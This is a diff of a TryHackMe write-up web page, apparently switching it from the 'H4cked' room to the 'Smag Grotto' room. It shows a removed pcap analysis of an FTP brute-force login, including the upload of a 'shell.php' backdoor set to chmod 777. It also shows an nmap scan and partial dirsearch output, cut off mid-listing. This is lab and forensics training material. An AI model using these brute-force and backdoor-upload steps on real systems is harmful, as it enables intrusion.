@@ -9,17 +9,15 @@
       
       
       
-        <link rel="prev" href="../poster/">
+        <link rel="prev" href="../h4cked/">
       
-      
-        <link rel="next" href="../SmagGrotto/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.13">
     
     
       
-        <title>H4cked - THM Writeups | Vasanth Vanan</title>
+        <title>Smag Grotto - THM Writeups | Vasanth Vanan</title>
       
     
     
@@ -104,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              H4cked
+              Smag Grotto
             
           </span>
         </div>
@@ -457,6 +455,20 @@
               
   
   
+  
+    <li class="md-nav__item">
+      <a href="../h4cked/" class="md-nav__link">
+        H4cked
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
     
   
   
@@ -467,12 +479,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          H4cked
+          Smag Grotto
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        H4cked
+        Smag Grotto
       </a>
       
         
@@ -496,16 +508,43 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#task-1" class="md-nav__link">
-    Task 1
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#task-2" class="md-nav__link">
-    Task 2
+  <a href="#initial-access" class="md-nav__link">
+    Initial Access
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-jake" class="md-nav__link">
+    Gaining user access (Jake)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-root-access" class="md-nav__link">
+    Gaining root access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -513,20 +552,6 @@
   
 </nav>
       
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../SmagGrotto/" class="md-nav__link">
-        Smag Grotto
-      </a>
     </li>
   
 
@@ -723,16 +748,43 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#task-1" class="md-nav__link">
-    Task 1
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#task-2" class="md-nav__link">
-    Task 2
+  <a href="#initial-access" class="md-nav__link">
+    Initial Access
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-jake" class="md-nav__link">
+    Gaining user access (Jake)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-root-access" class="md-nav__link">
+    Gaining root access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -754,9 +806,9 @@
   
 
 
-  <h1>H4cked</h1>
+  <h1>Smag Grotto</h1>
 
-<p><a class="md-button" href="https://tryhackme.com/room/h4cked">TryHackMe Link</a></p>
+<p><a class="md-button" href="https://tryhackme.com/room/smaggrotto">TryHackMe Link</a></p>
 <div class="admonition example">
 <p class="admonition-title">Description</p>
 <p><p id="desc" style="font-size:15px"></p></p>
@@ -818,22 +870,31 @@
 <span class="normal">23</span>
 <span class="normal">24</span>
 <span class="normal">25</span>
-<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># Nmap 7.93 scan initiated Wed Mar  1 20:02:56 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.199.134</span>
-<span class="w">  </span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="m">10.10</span><span class="n">.</span><span class="m">199.134</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># Nmap 7.93 scan initiated Thu Mar  2 00:07:03 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.80.3</span>
+<span class="w">  </span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="m">10.10</span><span class="n">.</span><span class="m">80.3</span>
 <span class="w">  </span><span class="n">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nf">up </span><span class="p">(</span><span class="m">0.15</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="n">.</span>
 <span class="w">  </span><span class="n">Not</span><span class="w"> </span><span class="n">shown</span><span class="o">:</span><span class="w"> </span><span class="m">998</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="nf">ports </span><span class="p">(</span><span class="n">reset</span><span class="p">)</span>
 <span class="w">  </span><span class="n">PORT</span><span class="w">   </span><span class="n">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span>
-<span class="hll"><span class="w">  </span><span class="m">21</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">     </span><span class="n">vsftpd</span><span class="w"> </span><span class="m">2.0</span><span class="n">.</span><span class="m">8</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">later</span>
-</span><span class="hll"><span class="w">  </span><span class="m">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="m">2.4</span><span class="n">.</span><span class="m">29</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
-</span><span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Apache2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Default</span><span class="w"> </span><span class="n">Page</span><span class="o">:</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="n">works</span>
-<span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="m">2.4</span><span class="n">.</span><span class="m">29</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="hll"><span class="w">  </span><span class="m">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="m">7.2</span><span class="n">p2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="m">4</span><span class="nf">ubuntu2.8 </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="m">2.0</span><span class="p">)</span>
+</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="o">:</span><span class="w"> </span>
+<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">74e0</span><span class="nf">e1b405856a15687e16daf2c76bee </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="nf">bd4362b9a1865136f8c7dff90f638fa3 </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="w">  </span><span class="o">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="nf">f9e7da078f10af970b3287c932d71b76 </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="hll"><span class="w">  </span><span class="m">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="m">2.4</span><span class="n">.</span><span class="m">18</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+</span><span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="m">2.4</span><span class="n">.</span><span class="m">18</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Smag</span>
 <span class="w">  </span><span class="n">No</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="nf">host </span><span class="p">(</span><span class="n">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">running</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">it</span><span class="p">,</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">)</span><span class="n">.</span>
 <span class="w">  </span><span class="n">TCP</span><span class="o">/</span><span class="n">IP</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">:</span>
-<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="nf">SCAN</span><span class="p">(</span><span class="n">V</span><span class="o">=</span><span class="m">7.93</span><span class="o">%E=4%</span><span class="n">D</span><span class="o">=</span><span class="m">3</span><span class="o">/</span><span class="m">1</span><span class="o">%OT=21%</span><span class="n">CT</span><span class="o">=</span><span class="m">1</span><span class="o">%CU=42710%</span><span class="n">PV</span><span class="o">=</span><span class="n">Y</span><span class="o">%DS=5%</span><span class="n">DC</span><span class="o">=</span><span class="n">I</span><span class="o">%G=Y%</span><span class="n">TM</span><span class="o">=</span><span class="m">63</span><span class="n">FFF5E2</span>
-<span class="w">  </span><span class="n">OS</span><span class="o">:%P=aarch64-unknown-linux-gnu)SEQ(SP=100%</span><span class="n">GCD</span><span class="o">=</span><span class="m">1</span><span class="o">%ISR=106%</span><span class="n">TI</span><span class="o">=</span><span class="n">Z</span><span class="o">%CI=Z%</span><span class="n">II</span><span class="o">=</span><span class="n">I</span><span class="o">%TS=</span>
-<span class="o">  OS:A)OPS(O1=M505ST11NW7%</span><span class="n">O2</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O3=M505NNT11NW7%</span><span class="n">O4</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O5=M5</span>
-<span class="o">  OS:05ST11NW7%</span><span class="n">O6</span><span class="o">=</span><span class="n">M505ST11</span><span class="p">)</span><span class="nf">WIN</span><span class="p">(</span><span class="n">W1</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W2=F4B3%</span><span class="n">W3</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W4=F4B3%</span><span class="n">W5</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W6=F4B</span>
-<span class="o">  OS:3)ECN(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="n">F507</span><span class="o">%O=M505NNSNW7%</span><span class="n">CC</span><span class="o">=</span><span class="n">Y</span><span class="o">%Q=)T1(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">S</span><span class="o">=</span><span class="n">O</span><span class="o">%A=S</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="nf">SCAN</span><span class="p">(</span><span class="n">V</span><span class="o">=</span><span class="m">7.93</span><span class="o">%E=4%</span><span class="n">D</span><span class="o">=</span><span class="m">3</span><span class="o">/</span><span class="m">2</span><span class="o">%OT=22%</span><span class="n">CT</span><span class="o">=</span><span class="m">1</span><span class="o">%CU=34695%</span><span class="n">PV</span><span class="o">=</span><span class="n">Y</span><span class="o">%DS=5%</span><span class="n">DC</span><span class="o">=</span><span class="n">I</span><span class="o">%G=Y%</span><span class="n">TM</span><span class="o">=</span><span class="m">64002</span><span class="n">F14</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:%P=aarch64-unknown-linux-gnu)SEQ(SP=104%</span><span class="n">GCD</span><span class="o">=</span><span class="m">1</span><span class="o">%ISR=109%</span><span class="n">TI</span><span class="o">=</span><span class="n">Z</span><span class="o">%CI=I%</span><span class="n">II</span><span class="o">=</span><span class="n">I</span><span class="o">%TS=</span>
+<span class="o">  OS:8)OPS(O1=M505ST11NW7%</span><span class="n">O2</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O3=M505NNT11NW7%</span><span class="n">O4</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O5=M5</span>
+<span class="o">  OS:05ST11NW7%</span><span class="n">O6</span><span class="o">=</span><span class="n">M505ST11</span><span class="p">)</span><span class="nf">WIN</span><span class="p">(</span><span class="n">W1</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="o">%W2=68DF%</span><span class="n">W3</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="o">%W4=68DF%</span><span class="n">W5</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="o">%W6=68D</span>
+<span class="o">  OS:F)ECN(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">6903</span><span class="o">%O=M505NNSNW7%</span><span class="n">CC</span><span class="o">=</span><span class="n">Y</span><span class="o">%Q=)T1(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">S</span><span class="o">=</span><span class="n">O</span><span class="o">%A=S</span>
 <span class="o">  OS:+%</span><span class="bp">F</span><span class="o">=</span><span class="n">AS</span><span class="o">%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T2</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">N</span><span class="p">)</span><span class="nf">T3</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">N</span><span class="p">)</span><span class="nf">T4</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=0%</span><span class="n">S</span><span class="o">=</span><span class="n">A</span><span class="o">%A=Z%</span><span class="bp">F</span><span class="o">=</span><span class="n">R</span><span class="o">%O=%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=</span>
 <span class="o">  OS:)T5(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">0</span><span class="o">%S=Z%</span><span class="n">A</span><span class="o">=</span><span class="n">S</span><span class="o">+%F=AR%</span><span class="n">O</span><span class="o">=%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T6</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=0%</span><span class="n">S</span><span class="o">=</span><span class="n">A</span><span class="o">%</span>
 <span class="o">  OS:A=Z%</span><span class="bp">F</span><span class="o">=</span><span class="n">R</span><span class="o">%O=%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=)T7(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">0</span><span class="o">%S=Z%</span><span class="n">A</span><span class="o">=</span><span class="n">S</span><span class="o">+%F=AR%</span><span class="n">O</span><span class="o">=%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">U1</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%</span>
@@ -841,64 +902,14 @@
 <span class="o">  OS:40%</span><span class="n">CD</span><span class="o">=</span><span class="n">S</span><span class="p">)</span>
 
 <span class="w">  </span><span class="n">Network</span><span class="w"> </span><span class="n">Distance</span><span class="o">:</span><span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="n">hops</span>
+<span class="w">  </span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="o">:</span><span class="w"> </span><span class="n">OS</span><span class="o">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="o">:</span><span class="w"> </span><span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">linux</span><span class="o">:</span><span class="n">linux_kernel</span>
 
 <span class="w">  </span><span class="n">OS</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="n">.</span>
-<span class="w">  </span><span class="c1"># Nmap done at Wed Mar  1 20:03:30 2023 -- 1 IP address (1 host up) scanned in 33.71 seconds</span>
+<span class="w">  </span><span class="c1"># Nmap done at Thu Mar  2 00:07:32 2023 -- 1 IP address (1 host up) scanned in 29.21 seconds</span>
 </code></pre></div></td></tr></table></div></li>
 </ul>
-<h2 id="task-1"><b>Task 1</b><a class="headerlink" href="#task-1" title="Permanent link">&para;</a></h2>
-<ul class="task-list">
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it. <a href="../assets/Capture.pcapng">Download the file here</a></p>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The attacker is trying to log into a specific service. What service is this? <strong><code>FTP</code></strong></p>
-<p>As I traced the TCP stream, I found the following:
-<div class="highlight"><pre><span></span><code><span class="m">220</span><span class="w"> </span><span class="n">Hello</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">World</span><span class="o">!</span>
-<span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
-<span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
-<span class="n">PASS</span><span class="w"> </span><span class="n">password</span>
-<span class="m">530</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">incorrect.</span>
-<span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
-<span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
-<span class="n">PASS</span><span class="w"> </span><span class="m">666666</span>
-<span class="m">530</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">incorrect.</span>
-</code></pre></div></p>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool? <strong><code>Hydra</code></strong></p>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The attacker is trying to log on with a specific username. What is the username? <strong><code>Jenny</code></strong></p>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> What is the user's password? </p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span>
-<span class="normal">3</span>
-<span class="normal">4</span>
-<span class="normal">5</span>
-<span class="normal">6</span>
-<span class="normal">7</span>
-<span class="normal">8</span>
-<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="m">220</span><span class="w"> </span><span class="n">Hello</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">World</span><span class="o">!</span>
-<span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
-<span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
-<span class="n">PASS</span><span class="w"> </span><span class="m">111111</span>
-<span class="m">530</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">incorrect.</span>
-<span class="hll"><span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
-</span><span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
-<span class="hll"><span class="n">PASS</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span>
-</span><span class="hll"><span class="m">230</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">successful.</span>
-</span></code></pre></div></td></tr></table></div>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> What is the current FTP working directory after the attacker logged in? <strong><code>/var/www/html</code></strong></p>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The attacker uploaded a backdoor. What is the backdoor's filename? <strong><code>shell.php</code></strong></p>
-</li>
-</ul>
+<h2 id="enumeration"><b>Enumeration</b><a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<p>During my assessment, I visited the http service at port 80, which did not surprise me. Later, I attempted to enumerate the hidden directories using <strong><code>dirsearch</code></strong> and I found the <strong>/mail</strong> folder. </p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
@@ -923,188 +934,115 @@
 <span class="normal">22</span>
 <span class="normal">23</span>
 <span class="normal">24</span>
-<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">  </span><span class="m">220</span><span class="w"> </span><span class="n">Hello</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">World</span><span class="o">!</span>
-<span class="w">  </span><span class="n">USER</span><span class="w"> </span><span class="n">jenny</span>
-<span class="w">  </span><span class="m">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password.</span>
-<span class="w">  </span><span class="n">PASS</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span>
-<span class="w">  </span><span class="m">230</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">successful.</span>
-<span class="w">  </span><span class="n">SYST</span>
-<span class="w">  </span><span class="m">215</span><span class="w"> </span><span class="n">UNIX</span><span class="w"> </span><span class="n">Type</span><span class="o">:</span><span class="w"> </span><span class="n">L8</span>
-<span class="w">  </span><span class="n">PWD</span>
-<span class="hll"><span class="w">  </span><span class="m">257</span><span class="w"> </span><span class="s">&quot;/var/www/html&quot;</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">directory</span>
-</span><span class="w">  </span><span class="n">PORT</span><span class="w"> </span><span class="m">192</span><span class="p">,</span><span class="m">168</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">147</span><span class="p">,</span><span class="m">225</span><span class="p">,</span><span class="m">49</span>
-<span class="w">  </span><span class="m">200</span><span class="w"> </span><span class="n">PORT</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">successful.</span><span class="w"> </span><span class="n">Consider</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">PASV.</span>
-<span class="w">  </span><span class="n">LIST</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
-<span class="w">  </span><span class="m">150</span><span class="w"> </span><span class="n">Here</span><span class="w"> </span><span class="n">comes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">listing.</span>
-<span class="w">  </span><span class="m">226</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">OK.</span>
-<span class="w">  </span><span class="n">TYPE</span><span class="w"> </span><span class="n">I</span>
-<span class="w">  </span><span class="m">200</span><span class="w"> </span><span class="n">Switching</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Binary</span><span class="w"> </span><span class="n">mode.</span>
-<span class="w">  </span><span class="n">PORT</span><span class="w"> </span><span class="m">192</span><span class="p">,</span><span class="m">168</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">147</span><span class="p">,</span><span class="m">196</span><span class="p">,</span><span class="m">163</span>
-<span class="w">  </span><span class="m">200</span><span class="w"> </span><span class="n">PORT</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">successful.</span><span class="w"> </span><span class="n">Consider</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">PASV.</span>
-<span class="hll"><span class="w">  </span><span class="n">STOR</span><span class="w"> </span><span class="n">shell.php</span>
-</span><span class="w">  </span><span class="m">150</span><span class="w"> </span><span class="n">Ok</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">data.</span>
-<span class="w">  </span><span class="m">226</span><span class="w"> </span><span class="n">Transfer</span><span class="w"> </span><span class="n">complete.</span>
-<span class="hll"><span class="w">  </span><span class="n">SITE</span><span class="w"> </span><span class="n">CHMOD</span><span class="w"> </span><span class="m">777</span><span class="w"> </span><span class="n">shell.php</span>
-</span><span class="w">  </span><span class="m">200</span><span class="w"> </span><span class="n">SITE</span><span class="w"> </span><span class="n">CHMOD</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">ok.</span>
-<span class="w">  </span><span class="n">QUIT</span>
-<span class="w">  </span><span class="m">221</span><span class="w"> </span><span class="n">Goodbye.</span>
+<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">44</span><span class="p">]</span><span class="w"> </span><span class="n">Starting</span><span class="o">:</span><span class="w"> </span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.ht_wsr.txt</span><span class="w">                                     </span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess.bak1</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess.orig</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess.sample</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess.save</span>
